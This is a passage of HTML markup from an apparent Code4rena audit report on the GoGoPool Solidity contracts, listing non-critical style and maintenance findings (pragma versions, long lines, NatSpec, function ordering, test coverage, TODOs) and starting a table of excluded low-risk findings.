fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑15] Use a more recent version of solidity</h2>\n<p>Use a solidity version of at least 0.8.13 to get the ability to use <code>using for</code> with a list of free functions.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">upgradeable</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC4626Upgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L2\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L2</a></p>\n<h2 id=\"n16-use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#n16-use-a-more-recent-version-of-solidity\" aria-label=\"n16 use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑16] Use a more recent version of solidity</h2>\n<ul>\n<li>Use a solidity version of at least 0.8.4 to get <code>bytes.concat()</code> instead of <code>abi.encodePacked(&#x3C;bytes>,&#x3C;bytes>)</code>.</li>\n<li>Use a solidity version of at least 0.8.12 to get <code>string.concat()</code> instead of <code>abi.encodePacked(&#x3C;str>,&#x3C;str>)</code>.</li>\n</ul>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">upgradeable</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20Upgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol#L2\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol#L2</a></p>\n<h2 id=\"n17-constant-redefined-elsewhere\" style=\"position:relative;\"><a href=\"#n17-constant-redefined-elsewhere\" aria-label=\"n17 constant redefined elsewhere permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑17] Constant redefined elsewhere</h2>\n<p>Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A <a href=\"https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678\">cheap way</a> to store constants in a single location is to create an <code>internal constant</code> in a <code>library</code>. If the variable is a local cache of another contract’s value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don’t get out of sync.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"n18-lines-are-too-long\" style=\"position:relative;\"><a href=\"#n18-lines-are-too-long\" aria-label=\"n18 lines are too long permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑18] Lines are too long</h2>\n<p>Usually lines in source code are limited to <a href=\"https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width\">80</a> characters. Today’s screens are much larger so it’s reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over <a href=\"https://github.com/aizatto/character-length\">164</a> characters, the lines below should be split when they reach that length</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:   \t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO.InflationIntervalRate&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1000133680617113500</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// 5% annual calculated on a daily interval - Calculate in js example: let dailyInflation = web3.utils.toBN((1 + 0.05) ** (1 / (365)) * 1e18);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L41\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L41</a></p>\n<h2 id=\"n19-variable-names-that-consist-of-all-capital-letters-should-be-reserved-for-constantimmutable-variables\" style=\"position:relative;\"><a href=\"#n19-variable-names-that-consist-of-all-capital-letters-should-be-reserved-for-constantimmutable-variables\" aria-label=\"n19 variable names that consist of all capital letters should be reserved for constantimmutable variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑19] Variable names that consist of all capital letters should be reserved for <code>constant</code>/<code>immutable</code> variables</h2>\n<p>If the variable needs to be different based on which class it comes from, a <code>view</code>/<code>pure</code> <em>function</em> should be used instead (e.g. like <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/76eee35971c2541585e05cbf258510dda7b2fbc6/contracts/token/ERC20/extensions/draft-IERC20Permit.sol#L59\">this</a>).</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"n20-using--without-specifying-an-upper-bound-is-unsafe\" style=\"position:relative;\"><a href=\"#n20-using--without-specifying-an-upper-bound-is-unsafe\" aria-label=\"n20 using  without specifying an upper bound is unsafe permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑20] Using <code>></code>/<code>>=</code> without specifying an upper bound is unsafe</h2>\n<p>There <em>will</em> be breaking changes in future versions of solidity, and at that point your code will no longer be compatable. While you may have the specific version to use in a configuration file, others that include your source files may not.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"n21-typos\" style=\"position:relative;\"><a href=\"#n21-typos\" aria-label=\"n21 typos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑21] Typos</h2>\n<p><em>There are 3 instances of this issue.</em></p>\n<h2 id=\"n22-file-is-missing-natspec\" style=\"position:relative;\"><a href=\"#n22-file-is-missing-natspec\" aria-label=\"n22 file is missing natspec permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑22] File is missing NatSpec</h2>\n<p><em>There are 3 instances of this issue.</em></p>\n<h2 id=\"n23-natspec-is-incomplete\" style=\"position:relative;\"><a href=\"#n23-natspec-is-incomplete\" aria-label=\"n23 natspec is incomplete permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑23] NatSpec is incomplete</h2>\n<p><em>There are 27 instances of this issue.</em></p>\n<h2 id=\"n24-not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\" style=\"position:relative;\"><a href=\"#n24-not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\" aria-label=\"n24 not using the named return variables anywhere in the function is confusing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑24] Not using the named return variables anywhere in the function is confusing</h2>\n<p>Consider changing the variable to be an unnamed one.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit mp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">572</span><span class=\"mtk1\">:  \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getMinipoolByNodeID</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L572\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L572</a></p>\n<h2 id=\"n25-contracts-should-have-full-test-coverage\" style=\"position:relative;\"><a href=\"#n25-contracts-should-have-full-test-coverage\" aria-label=\"n25 contracts should have full test coverage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑25] Contracts should have full test coverage</h2>\n<p>While 100% code coverage does not guarantee that there are no bugs, it often will catch easy-to-find bugs, and will ensure that there are fewer regressions when the code invariably has to be modified. Furthermore, in order to get full coverage, code authors will often have to re-organize their code so that it is more modular, so that each component can be tested separately, which reduces interdependencies between modules and layers, and makes for code that is easier to reason about and audit.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Various</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Files</span></span></span></code></pre>\n<h2 id=\"n26-large-or-complicated-code-bases-should-implement-fuzzing-tests\" style=\"position:relative;\"><a href=\"#n26-large-or-complicated-code-bases-should-implement-fuzzing-tests\" aria-label=\"n26 large or complicated code bases should implement fuzzing tests permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑26] Large or complicated code bases should implement fuzzing tests</h2>\n<p>Large code bases, or code with lots of inline-assembly, complicated math, or complicated interactions between multiple contracts, should implement <a href=\"https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05\">fuzzing tests</a>. Fuzzers such as Echidna require the test writer to come up with invariants which should not be violated under any circumstances, and the fuzzer tests various inputs and function calls to ensure that the invariants always hold. Even code with 100% code coverage can still have bugs due to the order of the operations a user performs, and fuzzers, with properly and extensively-written invariants, can close this testing gap significantly.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Various</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Files</span></span></span></code></pre>\n<h2 id=\"n27-function-ordering-does-not-follow-the-solidity-style-guide\" style=\"position:relative;\"><a href=\"#n27-function-ordering-does-not-follow-the-solidity-style-guide\" aria-label=\"n27 function ordering does not follow the solidity style guide permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑27] Function ordering does not follow the Solidity style guide</h2>\n<p>According to the <a href=\"https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions\">Solidity style guide</a>, functions should be laid out in the following order :<code>constructor()</code>, <code>receive()</code>, <code>fallback()</code>, <code>external</code>, <code>public</code>, <code>internal</code>, <code>private</code>, but the cases below do not follow this pattern.</p>\n<p><em>There are 15 instances of this issue.</em></p>\n<h2 id=\"n28-contract-does-not-follow-the-solidity-style-guides-suggested-layout-ordering\" style=\"position:relative;\"><a href=\"#n28-contract-does-not-follow-the-solidity-style-guides-suggested-layout-ordering\" aria-label=\"n28 contract does not follow the solidity style guides suggested layout ordering permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑28] Contract does not follow the Solidity style guide’s suggested layout ordering</h2>\n<p>The <a href=\"https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout\">style guide</a> says that, within a contract, the ordering should be 1) Type declarations, 2) State variables, 3) Events, 4) Modifiers, and 5) Functions, but the contract(s) below do not follow this ordering.</p>\n<p><em>There are 9 instances of this issue.</em></p>\n<h2 id=\"n29-open-todos\" style=\"position:relative;\"><a href=\"#n29-open-todos\" aria-label=\"n29 open todos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑29] Open TODOs</h2>\n<p>Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">412</span><span class=\"mtk1\">:  \t\t</span><span class=\"mtk3\">// TODO Revisit this logic if we ever allow unequal matched funds</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L412\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L412</a></p>\n<h2 id=\"excluded-findings\" style=\"position:relative;\"><a href=\"#excluded-findings\" aria-label=\"excluded findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excluded findings</h2>\n<p>These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness.</p>\n<h3 id=\"low-risk-issues-1\" style=\"position:relative;\"><a href=\"#low-risk-issues-1\" aria-label=\"low risk issues 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Issues</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[L‑08]</td>\n<td align=\"left\">Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[L‑09]</td>\n<td align=\"left\"><code>abi.encodePacked()</code> should not be used with dynamic types when passing the result to a hash function such as <code>keccak256()</code></td>\n<td align=\"center\">155</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 156 instances over 2 issues</p>\n<h3 id=\"non-critical-issues-1\" style=\"position:relative;\"><a href=\"#non-critical-issues-1\" aria-label=\"non critical issues 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 